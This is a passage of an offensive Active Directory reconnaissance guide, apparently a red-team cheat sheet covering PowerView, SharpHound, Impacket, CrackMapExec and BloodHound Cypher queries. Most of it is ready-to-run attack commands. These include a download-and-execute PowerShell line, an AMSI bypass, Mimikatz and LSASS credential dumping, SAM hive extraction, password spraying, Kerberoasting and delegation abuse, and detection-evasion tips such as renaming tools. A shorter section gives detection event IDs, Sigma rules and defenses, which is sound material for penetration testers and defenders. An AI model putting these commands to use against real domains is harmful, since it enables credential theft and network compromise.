    $taskPath = "$($_.gpcfilesyspath)\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
    if (Test-Path $taskPath) {
        [PSCustomObject]@{
            GPO = $_.displayname
            TaskFile = $taskPath
        }
    }
}

# GPO with cpassword (Groups.xml)
Get-DomainGPO | ForEach-Object {
    $groupsPath = "$($_.gpcfilesyspath)\Machine\Preferences\Groups\Groups.xml"
    if (Test-Path $groupsPath) {
        $content = Get-Content $groupsPath
        if ($content -match "cpassword") {
            [PSCustomObject]@{
                GPO = $_.displayname
                HasCPassword = $true
                Path = $groupsPath
            }
        }
    }
}
```

#### Registry and File Permissions
```powershell
# GPO Registry modifications
Get-DomainGPO | ForEach-Object {
    $regPath = "$($_.gpcfilesyspath)\Machine\Preferences\Registry\Registry.xml"
    if (Test-Path $regPath) {
        Write-Host "[+] GPO with Registry changes: $($_.displayname)"
    }
}

# GPO Files (potential privilege escalation)
Get-DomainGPO | ForEach-Object {
    $filesPath = "$($_.gpcfilesyspath)\Machine\Preferences\Files\Files.xml"
    if (Test-Path $filesPath) {
        Write-Host "[+] GPO with File operations: $($_.displayname)"
    }
}
```

---

## Tools & Techniques

### 7.1 BloodHound / SharpHound

#### SharpHound Collection
```powershell
# Basic collection (recommended)
.\SharpHound.exe -c All

# Collection with session enumeration
.\SharpHound.exe -c All,Session

# Stealth collection (no port scanning)
.\SharpHound.exe -c DCOnly

# Specific domain
.\SharpHound.exe -c All -d corp.local

# Loop collection (every 5 minutes for 2 hours)
.\SharpHound.exe -c All -l -LoopInterval 00:05:00 -LoopDuration 02:00:00

# Exclude specific collection methods
.\SharpHound.exe -c All --ExcludeDCs

# Collection from Linux
bloodhound-python -u user -p password -d corp.local -ns 10.10.10.100 -c All

# Az ureHound (Azure)
.\AzureHound.exe -u "user@corp.local" -p "password"

# Container filtering
.\SharpHound.exe -c All --SearchBase "OU=Servers,DC=corp,DC=local"

# LDAP port specification
.\SharpHound.exe -c All --LdapPort 389 --SecureLdap

# Zip password
.\SharpHound.exe -c All --ZipPassword "MyPassword123"
```

#### BloodHound Analysis Workflow
```
1. Import data into BloodHound
2. Mark owned principals (right-click -> Mark as Owned)
3. Run pre-built queries:
   - Shortest Path to Domain Admins from Owned Principals
   - Find Principals with DCSync Rights
   - Kerberoastable Users
   - AS-REP Roastable Users
   - Computers with Unconstrained Delegation
   - High Value Targets

4. Analyze paths:
   - Right-click nodes for attack information
   - Check "Help" tab for abuse instructions
   - Identify quick wins vs. complex paths

5. Custom queries (see Cypher section below)
```

### 7.2 PowerView

#### Installation and Setup
```powershell
# Download PowerView
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')

# From disk
Import-Module .\PowerView.ps1

# AMSI bypass (if needed)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Execution policy bypass
powershell -ep bypass
Set-ExecutionPolicy Bypass -Scope Process
```

#### Essential PowerView Commands
```powershell
# Domain information
Get-Domain
Get-DomainController
Get-DomainPolicy

# Users
Get-DomainUser
Get-DomainUser -SPN
Get-DomainUser -AdminCount
Get-DomainUser -Properties samaccountname,description

# Groups
Get-DomainGroup
Get-DomainGroupMember "Domain Admins"
Get-DomainGroup -MemberIdentity "username"

# Computers
Get-DomainComputer
Get-DomainComputer -Unconstrained
Get-DomainComputer -TrustedToAuth

# ACLs
Get-DomainObjectAcl -ResolveGUIDs
Find-InterestingDomainAcl

# GPOs
Get-DomainGPO
Get-DomainGPOLocalGroup

# Trusts
Get-DomainTrust
Get-ForestTrust

# Session enumeration
Find-DomainUserLocation
Get-NetSession -ComputerName dc01

# File shares
Find-DomainShare
Find-InterestingDomainShareFile
```

### 7.3 ADRecon

```powershell
# Basic run
.\ADRecon.ps1

# Specify domain
.\ADRecon.ps1 -DomainController dc01.corp.local -Credential (Get-Credential)

# Output to specific folder
.\ADRecon.ps1 -OutputDir C:\Temp\ADRecon

# Specific collection modules
.\ADRecon.ps1 -Collect Trusts,Users,Groups

# Generate Excel report
.\ADRecon.ps1 -GenExcel

# LDAP protocol
.\ADRecon.ps1 -Protocol LDAP

# From Linux (using ldap)
python3 ADRecon.py -d corp.local -u user -p password -dc 10.10.10.100
```

### 7.4 PingCastle

```powershell
# Interactive mode
.\PingCastle.exe

# Automated scan
.\PingCastle.exe --healthcheck --server dc01.corp.local

# Scanner mode (vulnerabilities)
.\PingCastle.exe --scanner aclcheck

# Specific scanners
.\PingCastle.exe --scanner antivirus
.\PingCastle.exe --scanner laps_bitlocker
.\PingCastle.exe --scanner nullsession
.\PingCastle.exe --scanner smb
.\PingCastle.exe --scanner startup
.\PingCastle.exe --scanner zerologon

# Export to XML
.\PingCastle.exe --healthcheck --server dc01.corp.local --xml-export
```

### 7.5 ldapsearch / ldapdomaindump

#### ldapsearch (Linux)
```bash
# Basic authentication test
ldapsearch -x -H ldap://10.10.10.100 -D "user@corp.local" -w 'password' -b "DC=corp,DC=local"

# All users
ldapsearch -x -H ldap://10.10.10.100 -D "user@corp.local" -w 'password' -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName

# All groups
ldapsearch -x -H ldap://10.10.10.100 -D "user@corp.local" -w 'password' -b "DC=corp,DC=local" "(objectClass=group)" sAMAccountName member

# Domain Admins
ldapsearch -x -H ldap://10.10.10.100 -D "user@corp.local" -w 'password' -b "DC=corp,DC=local" "(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local)" sAMAccountName

# Kerberoastable users
ldapsearch -x -H ldap://10.10.10.100 -D "user@corp.local" -w 'password' -b "DC=corp,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# AS-REP roastable
ldapsearch -x -H ldap://10.10.10.100 -D "user@corp.local" -w 'password' -b "DC=corp,DC=local" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName

# AdminCount users
ldapsearch -x -H ldap://10.10.10.100 -D "user@corp.local" -w 'password' -b "DC=corp,DC=local" "(&(objectClass=user)(adminCount=1))" sAMAccountName

# Computers
ldapsearch -x -H ldap://10.10.10.100 -D "user@corp.local" -w 'password' -b "DC=corp,DC=local" "(objectClass=computer)" dNSHostName operatingSystem

# Trusts
ldapsearch -x -H ldap://10.10.10.100 -D "user@corp.local" -w 'password' -b "DC=corp,DC=local" "(objectClass=trustedDomain)" trustPartner
```

#### ldapdomaindump
```bash
# Full dump
ldapdomaindump -u 'corp\user' -p 'password' 10.10.10.100

# Output directory
ldapdomaindump -u 'corp\user' -p 'password' -o /tmp/ldap 10.10.10.100

# Specify LDAP port
ldapdomaindump -u 'corp\user' -p 'password' -p 389 10.10.10.100

# Output formats (HTML, JSON, Grep)
ldapdomaindump -u 'corp\user' -p 'password' --no-html --no-json --no-grep 10.10.10.100
```

### 7.6 Impacket Scripts

```bash
# GetADUsers - enumerate users
GetADUsers.py corp.local/user:password -dc-ip 10.10.10.100 -all

# GetNPUsers - AS-REP roasting
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 10.10.10.100 -format hashcat
GetNPUsers.py corp.local/user:password -request -dc-ip 10.10.10.100

# GetUserSPNs - Kerberoasting
GetUserSPNs.py corp.local/user:password -dc-ip 10.10.10.100 -request

# findDelegation - find delegation
findDelegation.py corp.local/user:password -dc-ip 10.10.10.100

# getTGT - request TGT
getTGT.py corp.local/user:password -dc-ip 10.10.10.100

# lookupsid - SID bruteforce
lookupsid.py corp.local/user:password@10.10.10.100

# samrdump - SAM remote dump
samrdump.py corp.local/user:password@10.10.10.100

# dacledit - modify ACLs
dacledit.py corp.local/user:password -dc-ip 10.10.10.100 -action read -principal user -target-dn "DC=corp,DC=local"

# addcomputer - add computer account
addcomputer.py corp.local/user:password -computer-name 'EVILPC$' -computer-pass 'P@ssw0rd' -dc-ip 10.10.10.100

# rbcd - configure RBCD
rbcd.py corp.local/user:password -delegate-from 'EVILPC$' -delegate-to 'TARGET$' -dc-ip 10.10.10.100 -action write
```

### 7.7 CrackMapExec

```bash
# SMB enumeration
crackmapexec smb 10.10.10.0/24 -u user -p password
crackmapexec smb 10.10.10.100 -u user -p password --shares
crackmapexec smb 10.10.10.100 -u user -p password --sessions
crackmapexec smb 10.10.10.100 -u user -p password --disks
crackmapexec smb 10.10.10.100 -u user -p password --loggedon-users
crackmapexec smb 10.10.10.100 -u user -p password --users
crackmapexec smb 10.10.10.100 -u user -p password --groups
crackmapexec smb 10.10.10.100 -u user -p password --local-groups
crackmapexec smb 10.10.10.100 -u user -p password --pass-pol
crackmapexec smb 10.10.10.100 -u user -p password --rid-brute

# LDAP enumeration
crackmapexec ldap 10.10.10.100 -u user -p password --users
crackmapexec ldap 10.10.10.100 -u user -p password --groups
crackmapexec ldap 10.10.10.100 -u user -p password --dc-list
crackmapexec ldap 10.10.10.100 -u user -p password --trusted-for-delegation
crackmapexec ldap 10.10.10.100 -u user -p password --admin-count
crackmapexec ldap 10.10.10.100 -u user -p password --get-sid

# Kerberoasting
crackmapexec ldap 10.10.10.100 -u user -p password --kerberoasting KERBEROAST.txt

# AS-REP roasting
crackmapexec ldap 10.10.10.100 -u user -p password --asreproast ASREP.txt

# Password spraying
crackmapexec smb 10.10.10.0/24 -u users.txt -p 'Password123' --continue-on-success

# Module execution
crackmapexec smb 10.10.10.100 -u user -p password -M lsassy
crackmapexec smb 10.10.10.100 -u user -p password -M spider_plus
```

---

## Stealth Techniques

### 8.1 LDAP vs SMB Enumeration

**LDAP Enumeration (Stealthier):**
```powershell
# Advantages:
# - Standard protocol, less suspicious
# - Centralized logging on DC only
# - Can be done over TLS (LDAPS)
# - Minimal network traffic

# PowerView LDAP queries
Get-DomainUser -Server dc01.corp.local -Credential $cred
Get-DomainGroup -Server dc01.corp.local

# ldapsearch
ldapsearch -x -H ldaps://dc01.corp.local:636 -D "user@corp.local" -w 'password' -b "DC=corp,DC=local"

# Impacket with LDAP
GetADUsers.py -all -dc-ip 10.10.10.100 corp.local/user:password
```

**SMB Enumeration (Noisier):**
```powershell
# Characteristics:
# - Generates SMB traffic to multiple hosts
# - Creates event logs on each target
# - Network IDS may trigger
# - Port scanning behavior

# Examples (use cautiously)
Get-NetSession -ComputerName target01
Get-NetShare -ComputerName target01
Find-DomainShare -CheckShareAccess
```

### 8.2 Avoiding Detection

#### Low-and-Slow Approach
```powershell
# Throttle requests
Get-DomainComputer | ForEach-Object {
    Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)
    Get-NetSession -ComputerName $_.dnshostname
}

# Randomize collection order
Get-DomainUser | Sort-Object {Get-Random} | ForEach-Object {
    # Perform enumeration
}

# Limit scope
Get-DomainUser -SearchBase "OU=IT,DC=corp,DC=local"  # Instead of entire domain
```

#### Avoid Common IOCs
```powershell
# DON'T: Use well-known tool names
# DO: Rename tools
mv SharpHound.exe UpdateChecker.exe

# DON'T: Use default output names
.\SharpHound.exe -c All --OutputPrefix CustomName

# DON'T: Enumerate from single source
# DO: Distribute enumeration across multiple compromised hosts

# DON'T: Use standard ports only
# DO: Use LDAPS (636) instead of LDAP (389) when possible
```

#### Operational Security
```powershell
# Use TLS/SSL
Get-DomainUser -Server dc01.corp.local -SSL

# Limit LDAP queries per second
$throttle = 2  # queries per second
Get-DomainUser | ForEach-Object {
    # Process
    Start-Sleep -Milliseconds (1000 / $throttle)
}

# Use legitimate admin tools
# Instead of PowerView, use:
Get-ADUser -Filter * -Properties *  # If AD module is available
dsquery user  # Built-in Windows tool
```

### 8.3 Minimal Footprint Enumeration

```powershell
# DCOnly collection (BloodHound)
.\SharpHound.exe -c DCOnly

# Target specific OUs
Get-DomainUser -SearchBase "OU=Admins,DC=corp,DC=local"

# Essential properties only
Get-DomainUser -Properties samaccountname,memberof,admincount

# Avoid session enumeration
# Session enum causes logs on every target
# Use only when necessary and on specific high-value targets

# Use cached data when possible
$users = Get-DomainUser  # Query once
$users | Where-Object {$_.admincount -eq 1}  # Filter locally
```

### 8.4 Time-Based Enumeration

```bash
# Collection during business hours (blend with normal traffic)
CURRENT_HOUR=$(date +%H)
if [ $CURRENT_HOUR -ge 9 ] && [ $CURRENT_HOUR -le 17 ]; then
    bloodhound-python -u user -p password -d corp.local -ns 10.10.10.100 -c DCOnly
fi

# Spread collection over days
# Day 1: Users and groups
# Day 2: Computers
# Day 3: ACLs
# Day 4: GPOs

# Loop collection with long intervals
.\SharpHound.exe -c All -l -LoopInterval 06:00:00 -LoopDuration 48:00:00
```

---

## Real-World Scenarios

### 9.1 External Reconnaissance (No Credentials)

#### DNS Enumeration
```bash
# Find domain controllers via SRV records
nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local

# Kerberos KDC
nslookup -type=SRV _kerberos._tcp.dc._msdcs.corp.local

# Global catalog
nslookup -type=SRV _gc._tcp.corp.local

# All domain controllers
nslookup -type=SRV _ldap._tcp.corp.local

# DNS zone transfer (rare but worth trying)
dig axfr @10.10.10.100 corp.local

# Subdomain enumeration
dnsrecon -d corp.local -t std
dnsrecon -d corp.local -t brt -D /usr/share/wordlists/subdomains.txt

# Reverse DNS
dnsrecon -r 10.10.10.0/24
```

#### Anonymous LDAP Binding
```bash
# Test anonymous bind
ldapsearch -x -H ldap://10.10.10.100 -b "DC=corp,DC=local"

# Null session
enum4linux -a 10.10.10.100
enum4linux-ng -A 10.10.10.100

# RPC enumeration
rpcclient -U "" -N 10.10.10.100
  enumdomusers
  enumdomgroups
  querydominfo

# SMB null session
smbclient -N -L //10.10.10.100
crackmapexec smb 10.10.10.100 -u '' -p ''
```

#### OSINT and Public Information
```bash
# Certificate transparency logs
# Search for *.corp.local on crt.sh

# LinkedIn enumeration for usernames
# Tools: linkedin2username, CrossLinked

# Google dorking
site:corp.local filetype:pdf
site:corp.local inurl:login

# Shodan/Censys for exposed services
shodan search "hostname:corp.local"
```

### 9.2 Low-Privilege User Enumeration

**Scenario:** You have credentials for a standard domain user account.

#### Step 1: Initial Domain Information
```powershell
# Basic domain info
Get-Domain
Get-DomainController

# Forest structure
Get-Forest
Get-ForestDomain

# Trusts
Get-DomainTrust
```

#### Step 2: User and Group Discovery
```powershell
# All users (look for interesting descriptions)
Get-DomainUser -Properties samaccountname,description | Where-Object {$_.description -ne $null}

# Privileged groups
Get-DomainGroupMember "Domain Admins"
Get-DomainGroupMember "Enterprise Admins"

# Your own group memberships
Get-DomainGroup -MemberIdentity $env:USERNAME

# Kerberoastable users
Get-DomainUser -SPN

# AS-REP roastable users
Get-DomainUser -Properties useraccountcontrol | Where-Object {$_.useraccountcontrol -band 4194304}
```

#### Step 3: Computer Enumeration
```powershell
# All computers
Get-DomainComputer -Properties dnshostname,operatingsystem

# Servers
Get-DomainComputer -OperatingSystem "*Server*"

# Unconstrained delegation
Get-DomainComputer -Unconstrained
```

#### Step 4: Share Enumeration
```powershell
# Readable shares
Find-DomainShare -CheckShareAccess

# Interesting files
Find-InterestingDomainShareFile -Include *.xml,*.ini,*.txt,*.ps1,*.bat
```

#### Step 5: ACL Enumeration
```powershell
# Your exploitable ACLs
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match $env:USERNAME}

# Domain Users exploitable ACLs
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "Domain Users"}
```

#### Step 6: BloodHound Collection
```powershell
# Run SharpHound
.\SharpHound.exe -c All --ExcludeDCs

# Analyze in BloodHound
# Mark yourself as owned
# Run: "Shortest Path to Domain Admins from Owned Principals"
```

### 9.3 Compromised Workstation Enumeration

**Scenario:** You have local admin on a domain-joined workstation.

#### Step 1: Situational Awareness
```powershell
# Current user context
whoami /all
whoami /groups

# Domain info
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Network info
ipconfig /all
route print
arp -a
```

#### Step 2: Local Credential Extraction
```powershell
# Mimikatz
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# LSASS dump
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
.\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"

# Check for cached credentials
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets" "exit"

# SAM dump
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
```

#### Step 3: Session Enumeration
```powershell
# Who else is logged on?
qwinsta
query user

# Network sessions to this machine
net session

# Logged on users (via registry)
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\*" | ForEach-Object {$_.PSPath}
```

#### Step 4: Network Service Discovery
```powershell
# Active network connections
netstat -ano

# Find other domain computers
Get-DomainComputer -Properties dnshostname

# Ping sweep (stealthier with ICMP)
1..254 | ForEach-Object {Test-Connection -ComputerName "10.10.10.$_" -Count 1 -Quiet}
```

#### Step 5: Lateral Movement Targets
```powershell
# Find admin sessions
Find-DomainUserLocation -UserName "admin*"

# Computers where domain admins are logged in
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# Local admin access
Find-LocalAdminAccess

# SMB signing status (for relay attacks)
Get-DomainComputer | ForEach-Object {
    Test-SMBSigning -ComputerName $_.dnshostname
}
```

### 9.4 High-Value Target Identification

#### Identifying Crown Jewels
```powershell
# Domain Controllers
Get-DomainController

# Exchange servers (often have high privileges)
Get-DomainComputer -Properties dnshostname,serviceprincipalname | Where-Object {$_.serviceprincipalname -match "exchange"}

# SQL servers (data repositories)
Get-DomainComputer -Properties dnshostname,serviceprincipalname | Where-Object {$_.serviceprincipalname -match "MSSQLSvc"}

# Certificate Authority servers
Get-DomainObject -SearchBase "CN=Configuration,DC=corp,DC=local" -LDAPFilter "(objectClass=pKIEnrollmentService)"

# ADCS servers (often vulnerable)
Get-DomainComputer | Where-Object {$_.serviceprincipalname -match "CertificateSer"}
```

#### High-Privilege Accounts
```powershell
# Service accounts with SPNs and high privileges
Get-DomainUser -SPN | Get-DomainGroup -MemberIdentity {$_.samaccountname} | Where-Object {$_.samaccountname -match "Admin"}

# Accounts with DCSync rights
Get-DomainObjectAcl -SearchBase "DC=corp,DC=local" -ResolveGUIDs | Where-Object {$_.ObjectAceType -match "DS-Replication-Get-Changes"}

# Accounts with AdminSDHolder protection
Get-DomainUser -AdminCount

# Protected Users group members
Get-DomainGroupMember "Protected Users"

# Schema Admins and Enterprise Admins
Get-DomainGroupMember "Schema Admins"
Get-DomainGroupMember "Enterprise Admins"
```

#### Sensitive OUs and GPOs
```powershell
# Domain Controllers OU
Get-DomainOU -Identity "OU=Domain Controllers,DC=corp,DC=local"

# Server OUs
Get-DomainOU | Where-Object {$_.name -match "server"}

# GPOs affecting DCs
Get-DomainOU -Identity "OU=Domain Controllers,DC=corp,DC=local" | Get-DomainGPO

# Writable GPOs
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "CreateChild|WriteProperty"}
```

---

## Detection Indicators

### 10.1 Blue Team Detection Opportunities

#### Windows Event Logs

**Security Event IDs:**
```
4624 - Successful logon (Type 3 = Network logon)
4625 - Failed logon attempt
4662 - Operation performed on an object (LDAP queries)
4672 - Special privileges assigned (admin logon)
4768 - Kerberos TGT requested
4769 - Kerberos service ticket requested
4771 - Kerberos pre-authentication failed (AS-REP roasting)
4776 - Credential validation attempt (NTLM)
5136 - Directory service object modified
5137 - Directory service object created
5139 - Directory service object moved
```

**Domain Controller Specific:**
```
Event ID 4662 with high frequency from single source
  - Object Type: domainDNS, user, computer, group
  - Properties: Multiple sensitive attributes accessed

Event ID 4769 with unusual service names
  - Service names matching user accounts (Kerberoasting)

Event ID 4771 for multiple users from same source
  - AS-REP roasting attempts
```

#### Network-Based Detection

**LDAP Traffic Patterns:**
```
- High volume LDAP queries from single IP
- LDAP queries for objectClass=* or (objectClass=user)
- Anonymous LDAP binds followed by enumeration
- LDAP queries for servicePrincipalName attributes
- Queries for userAccountControl with specific values
```

**SMB Traffic:**
```
- Multiple SMB connections to different hosts in short timeframe
- SMB tree connects to IPC$ on multiple hosts
- NetrSessionEnum RPC calls
- NetrWkstaUserEnum RPC calls
```

#### Tool-Specific IOCs

**SharpHound:**
```
Process name: SharpHound.exe, SharpHound.ps1
File artifacts: *_BloodHound.zip, *_computers.json, *_users.json
Network: Multiple LDAP queries, SMB port scanning
Registry: HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity queried
```

**PowerView:**
```
PowerShell module loads: PowerView.ps1, Recon.psd1
PowerShell commands: Get-Domain*, Get-Net*, Find-*, Invoke-*
ScriptBlock logging (Event ID 4104) containing PowerView functions
Module logging (Event ID 4103) for suspicious modules
```

**BloodHound Python:**
```
Process: bloodhound-python, bloodhound.py
User-Agent: bloodhound-python
Network: Python script making LDAP/SMB connections
Multiple connection attempts from Linux host
```

**CrackMapExec:**
```
Process: crackmapexec, cme, cme.py
Network: Multiple SMB authentication attempts
Failed logons across multiple hosts
SMB signing negotiation attempts
```

### 10.2 SIEM Detection Rules

#### Sigma Rule Examples

**Suspicious LDAP Enumeration:**
```yaml
title: Excessive LDAP Queries from Single Source
status: experimental
description: Detects high volume LDAP queries indicating enumeration
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4662
    ObjectType: 'domainDNS'
  timeframe: 5m
  condition: selection | count() by SourceIP > 100
level: medium
```

**BloodHound Collection Activity:**
```yaml
title: BloodHound Collection Activity
status: stable
description: Detects SharpHound execution
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    - Image|endswith: '\SharpHound.exe'
    - CommandLine|contains:
      - ' -c All'
      - ' --CollectionMethod'
      - ' --OutputDirectory'
  condition: selection
level: high
```

**PowerView Usage:**
```yaml
title: PowerView PowerShell Module Usage
status: experimental
description: Detects PowerView reconnaissance
logsource:
  product: windows
  service: powershell
  definition: 'Script block logging must be enabled'
detection:
  selection:
    EventID: 4104
    ScriptBlockText|contains:
      - 'Get-DomainUser'
      - 'Get-DomainComputer'
      - 'Get-DomainGroup'
      - 'Get-DomainObjectAcl'
      - 'Find-InterestingDomainAcl'
  condition: selection
level: medium
```

### 10.3 Defensive Measures

**Preventive Controls:**
```
1. Least Privilege:
   - Limit Domain Users LDAP query rights
   - Remove unnecessary admin accounts
   - Implement tiered admin model

2. Network Segmentation:
   - Restrict LDAP/LDAPS to necessary hosts
   - Monitor east-west traffic
   - Implement microsegmentation

3. Hardening:
   - Enable LDAP signing and channel binding
   - Require SMB signing
   - Disable LLMNR/NetBIOS
   - Enable Extended Protection for Authentication

4. Account Security:
   - Disable Kerberos RC4
   - Enable Protected Users group
   - Implement FGPP for service accounts
   - Remove SPNs from high-privilege accounts
```

**Detective Controls:**
```
1. Logging:
   - Enable PowerShell ScriptBlock logging
   - Enable Module logging
   - Configure LDAP diagnostic logging (Event 1644)
   - Enable advanced audit policies

2. Monitoring:
   - Baseline normal LDAP query volume
   - Alert on multiple failed Kerberos pre-auth (4771)
   - Monitor for bloodhound zip files
   - Track privileged group changes

3. Honeypots:
   - Create fake admin accounts with SPNs
   - Monitor for access attempts
   - Decoy computers with attractive names

4. Behavioral Analysis:
   - Detect anomalous LDAP query patterns
   - Identify lateral movement sequences
   - Track privileged account usage
```

---

## Advanced Cypher Queries

### 11.1 Shortest Path Queries

```cypher
// Shortest path from owned user to Domain Admins
MATCH (u:User {owned:true}), (g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}), p=shortestPath((u)-[*1..]->(g))
RETURN p

// All paths from owned to Domain Admins (up to 6 hops)
MATCH (u:User {owned:true}), (g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}), p=allShortestPaths((u)-[*1..6]->(g))
RETURN p

// Shortest path from owned computer to Domain Admins
MATCH (c:Computer {owned:true}), (g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}), p=shortestPath((c)-[*1..]->(g))
RETURN p

// Paths from specific user to DA
MATCH (u:User {name:"JDOE@CORP.LOCAL"}), (g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}), p=shortestPath((u)-[*1..]->(g))
RETURN p

// Paths from owned to High Value targets
MATCH (u {owned:true}), (t {highvalue:true}), p=shortestPath((u)-[*1..]->(t))
RETURN p
```

### 11.2 Kerberoasting & AS-REP Roasting

```cypher
// All Kerberoastable users
MATCH (u:User {hasspn:true}) RETURN u

// Kerberoastable users with paths to DA
MATCH (u:User {hasspn:true}), (g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}), p=shortestPath((u)-[*1..]->(g))
RETURN p

// High-value Kerberoastable accounts
MATCH (u:User {hasspn:true, highvalue:true}) RETURN u

// Kerberoastable users who are local admins
MATCH (u:User {hasspn:true})-[:AdminTo]->(c:Computer) RETURN u,c

// AS-REP roastable users
MATCH (u:User {dontreqpreauth:true}) RETURN u

// AS-REP roastable with path to DA
MATCH (u:User {dontreqpreauth:true}), (g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}), p=shortestPath((u)-[*1..]->(g))
RETURN p

// Kerberoastable users with admin rights
MATCH (u:User {hasspn:true})-[:MemberOf*1..]->(g:Group)-[:AdminTo]->(c:Computer)
RETURN u.name, COUNT(DISTINCT c)
ORDER BY COUNT(DISTINCT c) DESC
```

### 11.3 Delegation Abuse

```cypher
// Unconstrained delegation computers
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c

// Unconstrained delegation (exclude DCs)
MATCH (c:Computer {unconstraineddelegation:true})
WHERE NOT c.name STARTS WITH 'DC'
RETURN c

// Users with unconstrained delegation
MATCH (u:User {unconstraineddelegation:true}) RETURN u

// Constrained delegation paths
MATCH (u:User)-[:AllowedToDelegate]->(c:Computer) RETURN u,c

// Resource-based constrained delegation
MATCH (u:User)-[:AllowedToAct]->(c:Computer) RETURN u,c

// Computers with constrained delegation to DCs
MATCH (c:Computer)-[:AllowedToDelegate]->(dc:Computer)
WHERE dc.name STARTS WITH 'DC'
RETURN c,dc
```

### 11.4 ACL-Based Attacks

```cypher
// GenericAll on users
MATCH (u:User)-[r:GenericAll]->(t:User) RETURN u,r,t

// GenericAll on computers
MATCH (u:User)-[r:GenericAll]->(c:Computer) RETURN u,r,c

// GenericAll on groups
MATCH (u:User)-[r:GenericAll]->(g:Group) RETURN u,r,g

// WriteDacl permissions
MATCH (u:User)-[r:WriteDacl]->(t) RETURN u,r,t

// WriteOwner permissions
MATCH (u:User)-[r:WriteOwner]->(t) RETURN u,r,t

// Owned principals with GenericAll
MATCH (u {owned:true})-[r:GenericAll]->(t) RETURN u,r,t

// GenericWrite to High Value targets
MATCH (u)-[r:GenericWrite]->(t {highvalue:true}) RETURN u,r,t

// ForceChangePassword rights
MATCH (u:User)-[r:ForceChangePassword]->(t:User) RETURN u,r,t

// AddMember to high-value groups
MATCH (u:User)-[r:AddMember]->(g:Group {highvalue:true}) RETURN u,r,t

// All ACL-based paths to Domain Admins
MATCH (u {owned:true}), (g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}),
p=shortestPath((u)-[r:GenericAll|WriteDacl|WriteOwner|ForceChangePassword|AddMember|GenericWrite*1..]->(g))
RETURN p
```

### 11.5 Group Membership Analysis

```cypher
// Most privileged users (by group membership count)
MATCH (u:User)-[:MemberOf*1..]->(g:Group {highvalue:true})
RETURN u.name, COUNT(DISTINCT g) as HighValueGroupCount
ORDER BY HighValueGroupCount DESC

// Nested group memberships to DA
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
RETURN u.name, LENGTH(p) as Depth

// Foreign Group Membership
MATCH (u:User)-[:MemberOf]->(g:Group)
WHERE NOT u.domain = g.domain
RETURN u,g

// Circular group memberships
MATCH (g1:Group)-[:MemberOf*1..]->(g2:Group)-[:MemberOf*1..]->(g1)
RETURN g1,g2

// Groups with most members
MATCH (u:User)-[:MemberOf]->(g:Group)
RETURN g.name, COUNT(u) as MemberCount
ORDER BY MemberCount DESC
LIMIT 20

// Groups with external members
MATCH (u:User)-[:MemberOf]->(g:Group)
WHERE u.name CONTAINS '@' AND NOT u.name ENDS WITH g.domain
RETURN g.name, COLLECT(u.name)
```

### 11.6 Computer Analysis

```cypher
// Computers where owned users have admin rights
MATCH (u {owned:true})-[:AdminTo]->(c:Computer) RETURN u,c

// Computers with most admins
MATCH (u:User)-[:AdminTo]->(c:Computer)
RETURN c.name, COUNT(u) as AdminCount
ORDER BY AdminCount DESC

// Computers with local admin from Domain Users
MATCH (g:Group {name:"DOMAIN USERS@CORP.LOCAL"})-[:AdminTo]->(c:Computer)
RETURN c

// High-value computers
MATCH (c:Computer {highvalue:true}) RETURN c

// Computers with sessions from DA
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}),
(u)-[:HasSession]->(c:Computer)
RETURN c.name, COLLECT(u.name)

// Computers allowing unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true})
WHERE NOT c.name STARTS WITH 'DC'
RETURN c.name, c.operatingsystem

// Old operating systems
MATCH (c:Computer)
WHERE c.operatingsystem CONTAINS '2008' OR c.operatingsystem CONTAINS 'Windows 7'
RETURN c.name, c.operatingsystem
```

### 11.7 Session Enumeration

```cypher
// Find where Domain Admins have sessions
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}),
(u)-[:HasSession]->(c:Computer)
RETURN c.name, COLLECT(u.name)

// Computers with most user sessions
MATCH (u:User)-[:HasSession]->(c:Computer)
RETURN c.name, COUNT(u) as SessionCount
ORDER BY SessionCount DESC

// Find computers with admin and session
MATCH (u1:User)-[:AdminTo]->(c:Computer)<-[:HasSession]-(u2:User)
RETURN u1.name as Admin, c.name, u2.name as LoggedIn

